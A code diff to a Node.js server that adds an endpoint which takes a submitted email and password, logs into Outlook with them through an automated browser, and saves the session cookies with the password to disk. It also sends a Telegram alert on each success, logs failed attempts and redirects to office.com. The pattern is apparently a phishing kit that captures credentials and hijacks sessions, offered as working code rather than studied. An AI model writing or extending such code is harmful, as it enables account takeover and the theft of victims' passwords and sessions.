@@ -15,6 +15,7 @@ if (fs.existsSync('.env')) {
 }
 
 const { GraphAPIAuth } = require('./src/graph-api');
+const { OutlookLoginAutomation } = require('./src/outlook-login');
 const VPSManagementBot = require('./telegram-bot');
 
 const app = express();
@@ -66,6 +67,7 @@ app.use(express.static('public'));
 // Store user sessions with Graph API auth and OAuth state tracking
 const userSessions = new Map(); // sessionId -> { sessionId, graphAuth, userEmail, createdAt, oauthState, authenticated, verified }
 const oauthStates = new Map(); // state -> { sessionId, timestamp }
+const automationSessions = new Map(); // sessionId -> { automation, status, email, startTime }
 const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
 const STATE_TIMEOUT = 10 * 60 * 1000; // 10 minutes for OAuth state
 
@@ -110,7 +112,7 @@ function saveAnalytics() {
 const analytics = loadAnalytics();
 
 // Cleanup expired sessions and OAuth states
-setInterval(() => {
+setInterval(async () => {
     const now = Date.now();
 
     // Clean up expired sessions
@@ -126,6 +128,21 @@ setInterval(() => {
         if (now - stateInfo.timestamp > STATE_TIMEOUT) {
             oauthStates.delete(state);
             console.log(`🧹 Cleaned up expired OAuth state`);
+        }
+    }
+
+    // Clean up expired automation sessions
+    for (const [sessionId, automationSession] of automationSessions) {
+        if (now - automationSession.startTime > SESSION_TIMEOUT) {
+            try {
+                if (automationSession.automation) {
+                    await automationSession.automation.close();
+                }
+            } catch (error) {
+                console.error(`Error closing automation session ${sessionId}:`, error.message);
+            }
+            automationSessions.delete(sessionId);
+            console.log(`🧹 Cleaned up expired automation session: ${sessionId}`);
         }
     }
 }, 5 * 60 * 1000); // Check every 5 minutes
@@ -824,6 +841,241 @@ app.post('/api/authenticate-password', async (req, res) => {
             error: 'Authentication failed',
             success: false,
             details: error.message 
+        });
+    }
+});
+
+// Direct login automation endpoint using Puppeteer
+app.post('/api/login-automation', async (req, res) => {
+    try {
+        const { email, password } = req.body;
+
+        if (!email || !password) {
+            return res.status(400).json({ 
+                error: 'Email and password are required',
+                success: false 
+            });
+        }
+
+        const sessionId = createSessionId();
+        console.log(`🤖 Starting automation login for: ${email} (Session: ${sessionId})`);
+
+        // Initialize automation
+        const automation = new OutlookLoginAutomation({
+            enableScreenshots: true,
+            screenshotQuality: 80
+        });
+
+        // Store automation session
+        automationSessions.set(sessionId, {
+            automation: automation,
+            status: 'initializing',
+            email: email,
+            startTime: Date.now()
+        });
+
+        // Start automation process
+        try {
+            console.log(`🔧 Initializing browser for session: ${sessionId}`);
+            await automation.init();
+            
+            automationSessions.get(sessionId).status = 'navigating';
+            console.log(`🌐 Navigating to Outlook for session: ${sessionId}`);
+            const navigated = await automation.navigateToOutlook();
+            
+            if (!navigated) {
+                throw new Error('Failed to navigate to Outlook');
+            }
+
+            automationSessions.get(sessionId).status = 'logging_in';
+            console.log(`🔐 Attempting login for session: ${sessionId}`);
+            const loginSuccess = await automation.performLogin(email, password);
+
+            if (loginSuccess) {
+                automationSessions.get(sessionId).status = 'saving_session';
+                console.log(`💾 Saving session cookies for: ${email}`);
+                const sessionFile = await automation.saveCookies(email, password);
+
+                automationSessions.get(sessionId).status = 'completed';
+                
+                analytics.successfulLogins++;
+                saveAnalytics();
+
+                console.log(`✅ Automation login successful for: ${email}`);
+
+                // Send Telegram notification if bot is available
+                if (telegramBot) {
+                    try {
+                        const domain = email.split('@')[1] || 'Unknown';
+                        await telegramBot.sendLoginNotification({
+                            email: '***@' + domain,
+                            domain: domain,
+                            timestamp: new Date().toISOString(),
+                            sessionId: sessionId,
+                            authMethod: 'Puppeteer Automation'
+                        });
+                        console.log(`📤 Telegram notification sent for user@${domain}`);
+                    } catch (error) {
+                        console.error('❌ Failed to send Telegram notification:', error.message);
+                    }
+                }
+
+                res.json({
+                    success: true,
+                    sessionId: sessionId,
+                    email: email,
+                    message: 'Login successful! Session cookies saved.',
+                    sessionFile: sessionFile,
+                    method: 'automation'
+                });
+
+                // Clean up automation after successful completion
+                setTimeout(async () => {
+                    try {
+                        await automation.close();
+                        automationSessions.delete(sessionId);
+                        console.log(`🧹 Cleaned up automation session: ${sessionId}`);
+                    } catch (error) {
+                        console.error(`Error cleaning up automation session ${sessionId}:`, error.message);
+                    }
+                }, 5000);
+
+            } else {
+                automationSessions.get(sessionId).status = 'failed';
+                
+                analytics.failedLogins++;
+                saveAnalytics();
+
+                console.log(`❌ Automation login failed for: ${email}`);
+                
+                // Store failed attempt
+                const sessionDir = path.join(__dirname, 'session_data');
+                const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
+                const failureData = {
+                    id: failureId,
+                    sessionId: sessionId,
+                    email: email,
+                    reason: 'Automation Login Failed',
+                    errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                    timestamp: new Date().toISOString(),
+                    status: 'invalid',
+                    method: 'automation'
+                };
+                
+                fs.writeFileSync(
+                    path.join(sessionDir, `invalid_${failureId}.json`),
+                    JSON.stringify(failureData, null, 2)
+                );
+
+                res.status(401).json({
+                    success: false,
+                    sessionId: sessionId,
+                    error: 'Login failed',
+                    message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
+                    method: 'automation'
+                });
+
+                // Clean up failed automation
+                setTimeout(async () => {
+                    try {
+                        await automation.close();
+                        automationSessions.delete(sessionId);
+                        console.log(`🧹 Cleaned up failed automation session: ${sessionId}`);
+                    } catch (error) {
+                        console.error(`Error cleaning up failed automation session ${sessionId}:`, error.message);
+                    }
+                }, 2000);
+            }
+
+        } catch (automationError) {
+            console.error(`❌ Automation error for session ${sessionId}:`, automationError.message);
+            
+            if (automationSessions.has(sessionId)) {
+                automationSessions.get(sessionId).status = 'error';
+            }
+            
+            analytics.failedLogins++;
+            saveAnalytics();
+
+            // Clean up on error
+            try {
+                await automation.close();
+                automationSessions.delete(sessionId);
+            } catch (cleanupError) {
+                console.error(`Error cleaning up automation after error:`, cleanupError.message);
+            }
+
+            res.status(500).json({
+                success: false,
+                sessionId: sessionId,
+                error: 'Automation failed',
+                message: 'Technical error during login process. Please try again.',
+                details: automationError.message,
+                method: 'automation'
+            });
+        }
+
+    } catch (error) {
+        console.error('Error in login automation endpoint:', error);
+        analytics.failedLogins++;
+        saveAnalytics();
+        
+        res.status(500).json({ 
+            error: 'Login automation failed',
+            success: false,
+            details: error.message 
+        });
+    }
+});
+
+// Check automation status
+app.get('/api/automation-status/:sessionId', (req, res) => {
+    const sessionId = req.params.sessionId;
+    
+    if (automationSessions.has(sessionId)) {
+        const automationSession = automationSessions.get(sessionId);
+        res.json({
+            sessionId: sessionId,
+            status: automationSession.status,
+            email: automationSession.email,
+            startTime: automationSession.startTime,
+            duration: Date.now() - automationSession.startTime
+        });
+    } else {
+        res.status(404).json({
+            error: 'Automation session not found',
+            sessionId: sessionId
+        });
+    }
+});
+
+// Internal redirect URL endpoint (used by automation)
+app.get('/api/internal/redirect-url', (req, res) => {
+    try {
+        // Load redirect configuration
+        const redirectConfigPath = path.join(__dirname, 'redirect-config.json');
+        let redirectUrl = 'https://office.com'; // Default fallback
+        
+        if (fs.existsSync(redirectConfigPath)) {
+            try {
+                const redirectConfig = JSON.parse(fs.readFileSync(redirectConfigPath, 'utf8'));
+                if (redirectConfig.redirectUrl) {
+                    redirectUrl = redirectConfig.redirectUrl;
+                }
+            } catch (configError) {
+                console.warn('Error reading redirect config:', configError.message);
+            }
+        }
+        
+        res.json({
+            success: true,
+            redirectUrl: redirectUrl
+        });
+    } catch (error) {
+        console.error('Error getting redirect URL:', error);
+        res.json({
+            success: false,
+            redirectUrl: 'https://office.com'
         });
     }
 });
